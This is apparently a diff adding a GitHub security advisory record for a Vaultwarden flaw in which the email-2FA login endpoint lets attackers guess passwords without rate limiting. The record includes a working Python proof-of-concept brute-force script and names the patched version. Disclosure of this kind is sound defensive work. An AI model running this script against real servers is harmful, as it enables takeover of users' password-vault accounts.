@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-c5rv-q295-7w4g",
+  "repo": {
+    "cve_id": "CVE-2026-43914",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-307"
+    ],
+    "description": "### Summary\r\nThere is a brute-force protection bypass vulnerability in Vaultwarden before version 1.35.4 if email 2fa is enabled.\r\n\r\n### Details\r\nThere is a security vulnerability in Vaultwarden before version 1.35.4 that allows bypassing the login brute-force protection if email 2fa is enabled.\r\n\r\nYou implement the function `check_limit_login` to rate-limit failed logins. This function protects `_sso_login`, `_password_login` and `_api_key_login`. \r\nHowever, if email 2fa is enabled, the unprotected 2fa-function `send_email_login` (email.rs, api endpoint `/api/two-factor/send-email-login`) also acts as an oracle determining whether a username-password combination is correct. An attacker can abuse that endpoint to brute-force passwords without rate-limiting. This works even for users who don't have email 2fa configured.\r\n\r\nIf the username-password combination is correct, this endpoint returns a status_code 200 (and sends a 2fa code via email to the victim) or returns the message \"Two factor not found\". \r\nIf the username-password combination is wrong, it returns \"Username or password is incorrect\".\r\nThis method doesn't work if email 2FA isn't enabled.\r\n\r\nI've attached a small Python PoC script (as txt file due to mail filtering) that demonstrates this brute-force attack. It's hard-coded with the default sha256-pbkdf using 600k iterations. A better PoC would dynamically retrieve the pbkdf and the iteration count from /identity/accounts/prelogin for each target user individually.\r\n\r\nMy recommendation would be to include the `check_limit_login` in the function `send_email_login`. \r\nThis vulnerability was fixed in [PR 6867](https://github.com/dani-garcia/vaultwarden/pull/6867) resp. [Version 1.35.4](https://github.com/dani-garcia/vaultwarden/releases/tag/1.35.4).\r\n\r\n### PoC\r\n```\r\nimport base64\r\nimport hashlib\r\nimport requests\r\nimport random\r\nimport string\r\n\r\ndef vw_hash_pbkdf2(email: str, password: str, iterations: int) -> str:\r\n    salt = email.strip().lower().encode(\"utf-8\")\r\n    master_key = hashlib.pbkdf2_hmac(\"sha256\", password.encode(\"utf-8\"), salt, iterations, dklen=32)\r\n    master_password_hash = hashlib.pbkdf2_hmac(\"sha256\", master_key, password.encode(\"utf-8\"), 1, dklen=32)\r\n    return base64.b64encode(master_password_hash).decode(\"ascii\")\r\n\r\ndef bruteforce_passwords(target_url, target_user, bruteforce_candidates, iterations):\r\n    for candidate in bruteforce_candidates:\r\n        candidate_hash = vw_hash_pbkdf2(target_user, candidate, iterations)\r\n        data = dict()\r\n        data[\"email\"] = target_user\r\n        data[\"masterPasswordHash\"] = candidate_hash\r\n        data[\"deviceIdentifier\"] = \"x\" # dummy value is fine        \r\n        result = requests.post(f\"{target_url}/api/two-factor/send-email-login\", json=data)    \r\n        if result.status_code == 400 and \"Username or password is incorrect\" in result.text:\r\n            print(\"[-] Password wrong. Trying next...\")\r\n        elif result.status_code == 400 and \"Email 2FA is disabled\"  in result.text:\r\n            print(\"[-] E-Mail 2FA is disabled, /api/two-factor/send-email-login can not be abused for bypassing the brute-force rate limit.\")\r\n            return None\r\n        elif result.status_code == 200 or (result.status_code == 400 and \"Two factor not found\" in result.text):\r\n            print(f\"[+] Password found: {candidate} (master password hash: {candidate_hash}).\")\r\n            return candidate\r\n    return None\r\n\r\ndef main():\r\n    target_url = \"https://bitwarden.local\"\r\n    target_user = \"user@localhost\"\r\n    print(f\"[+] Starting password brute force against {target_url} and user {target_user}\")\r\n    iterations = 600000  # hardcoded, but can be dynamically retrieved from endpoint /identity/accounts/prelogin    \r\n    correct_password = \"ThisIsTheCorrectPassword123!\"\r\n    assert vw_hash_pbkdf2(target_user, correct_password, iterations) == \"kKKaRQ3ZQruB6qUIbO66qG96GUHVEtpdh1IX+kJZmS4=\"\r\n\r\n    dummy_passwords = [''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20)) for _ in range(20)]\r\n    bruteforce_candidates = dummy_passwords + [correct_password]\r\n    bruteforce_passwords(target_url, target_user, bruteforce_candidates, iterations)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\n### Impact\r\nAn attacker can brute-force user passwords without brute-force protection. If email 2FA is enabled, all users are affected (even those that have not configured email 2FA).\r\n",
+    "ghsa_id": "GHSA-c5rv-q295-7w4g",
+    "html_url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-c5rv-q295-7w4g",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-c5rv-q295-7w4g"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-43914"
+      }
+    ],
+    "published_at": "2026-04-25T21:05:10Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Brute-force protection bypass vulnerability",
+    "updated_at": "2026-05-04T17:50:32Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "vaultwarden"
+        },
+        "patched_versions": "1.35.4",
+        "vulnerable_version_range": "<1.35.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "dani-garcia/vaultwarden"
+}
